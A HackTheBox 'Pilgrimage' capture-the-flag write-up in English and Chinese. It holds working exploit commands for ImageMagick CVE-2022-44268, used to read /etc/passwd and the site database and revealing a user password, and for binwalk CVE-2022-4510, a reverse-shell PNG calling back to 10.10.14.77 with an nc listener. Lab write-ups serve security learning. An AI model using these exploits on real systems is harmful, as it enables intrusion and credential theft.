HackTheBox: Pilgrimage
===

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/machines/Pilgrimage

### Initial Enumeration

●Start Machine: 
![](https://hackmd.io/_uploads/HykMZrTWa.png)


## Solution

### 1. Attempt

#### 1.1 Edit /etc/hosts
/etc/hosts
> 10.10.11.219    pilgrimage.htb

#### 1.2 Browse http://pilgrimage.htb/
![](https://hackmd.io/_uploads/SkyCbS6WT.png)

#### 1.3 nmap scan 
> nmap -sC -sV -Pn -T4 10.10.11.219

![](https://hackmd.io/_uploads/HJGVfB6Wa.png)

#### 1.4 dirsearch tools
> dirsearch -u http://pilgrimage.htb/

![](https://hackmd.io/_uploads/BkgfVSaWp.png)
![](https://hackmd.io/_uploads/ByENEB6-p.png)

### 2. Git-dumper tool
#### ●GitTools: (https://github.com/internetwache/GitTools)
#### 2.1 Git-dumper
> cd /home/(usrname)/.local/lib/python3.10/site-packages
> python3 git_dumper.py http://pilgrimage.htb/.git/ Pilgrimage

![](https://hackmd.io/_uploads/B1QSPHTZa.png)

#### 2.2 Enter output dir
![](https://hackmd.io/_uploads/S1GKwHabT.png)
> assets/  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor/

### 3. ImageMagick LFI: CVE-2022-44268
#### 3.1 [ImageMagick 功能](https://www.w3cschool.cn/imagemagick_use/):
ImageMagick是一套功能強大、穩定且開源的工具集和開發包，可以用來讀、寫和處理超過89種基本格式的圖片文件，包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。
●index.php 使用 ImageMagick
```php=
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

#### 3.2 Check magick version
> file magick
> ./magick -version
● [dlopen(): error loading libfuse.so.2](https://github.com/AppImage/AppImageKit/wiki/FUSE)

![](https://hackmd.io/_uploads/BkPcj_0ba.png)
> Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911

#### 3.3 CVE-2022-44268 
● [ImageMagick LFI [CVE-2022-44268]](https://github.com/Sybil-Scan/imagemagick-lfi-poc?source=post_page-----9e070a99ac40--------------------------------): 
The researchers at MetabaseQ discovered CVE-2022-44268, i.e. **ImageMagick 7.1.0-49** is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary remote file (if the ImageMagick binary has permissions to read it).

#### 3.4 Generate.py package
> git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc.git
> python3 generate.py -f "/etc/passwd" -o exploit.png  #在/etc/passwd 建立png檔

![](https://hackmd.io/_uploads/SJEuItAW6.png)
> [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png

> convert exploit.png result.png #轉換產出的png
> identify -verbose result.png #查看result.png內容

![](https://hackmd.io/_uploads/r1-ARK0-T.png)

```
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin

emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
> Find user: **emily**

### 4. Sqlite
dashboard.php 帶有資料庫
```php=
function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
}
```
#### 4.1 Generate.py package in Sqlite
(用上述一樣的方法，注入/var/db/pilgrimage上傳 payload)
> python3 generate.py -f "/var/db/pilgrimage" -o sqlite.png  
> #在/var/db/pilgrimage 建立png檔

![](https://hackmd.io/_uploads/Hyzdw8LfT.png)
> [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > sqlite.png
   
> convert sqlite.png sqlite.png #轉換產出的png
> identify -verbose sqlite.png #查看sqlite.png內容

![](https://hackmd.io/_uploads/S1HXuLIz6.png)

#### 4.5 HEX 轉換成 sqlite
https://github.com/kljunowsky/CVE-2022-44268
> python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6538d99eec52a.png > sqlite.sql

> cat sqlite.sql| xxd -r -p - > sqlite.dump

>  sqlite3 sqlite.dump

> sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
CREATE INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;

**GET emily password: abigchonkyboi123**

(不可行)

### 8. Binwalk 遠端程式碼: CVE-2022-4510
#### 8.1 [Binwalk 功能](https://cloud.tencent.com/developer/article/1515285):
Binwalk是一款快速、易用，用於分析，逆向工程和提取韌體映像的工具。簡單易用，完全自動化腳本，並透過自訂簽名，提取規則和插件模組，還重要一點的是可以輕鬆擴展。在CTF的MISC類題型和IOT安全的韌體解包分析中廣泛應用，可以大幅提高效率。該工具對linux支援較好，對於windows功能支援較差。
##### 8.1.1 /usr/local/bin/binwalk 使用 Binwalk
```
emily@pilgrimage:/usr/sbin$ cat malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

##### 8.1.2 Check binwalk version
> binwalk -h

![](https://hackmd.io/_uploads/BJ7q9_Lz6.png)
> Binwalk v2.3.2

##### 8.1.3 Vulnerable CVE-2022-4510
> git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
> python3 exploit_generator.py reverse CTF.png 10.10.14.77 8520

![](https://hackmd.io/_uploads/BJev-XFLGp.png)
> binwalk_exploit.png  CTF.png   LICENSE  README.md  walkingpath.py

##### 8.1.4 Create ncat listening port
> nc -nvlp 8520

![](https://hackmd.io/_uploads/SknWXg3zp.png)

##### 8.1.5 Copy png to SSH
> scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shurnk

![](https://hackmd.io/_uploads/SJgELtUfa.png)
(emily has no edit permission in /var/www/pilgrimage.htb/shurnk)

> scp binwalk_exploit.png emily@10.10.11.219:/home/emily

![](https://hackmd.io/_uploads/HJlJgzgnGa.png)
> emily@pilgrimage:~$ ps -aux
> emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
> emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/

> **FLAG: 7bf8248e0de3a58ea60325e30e8ef9a8**
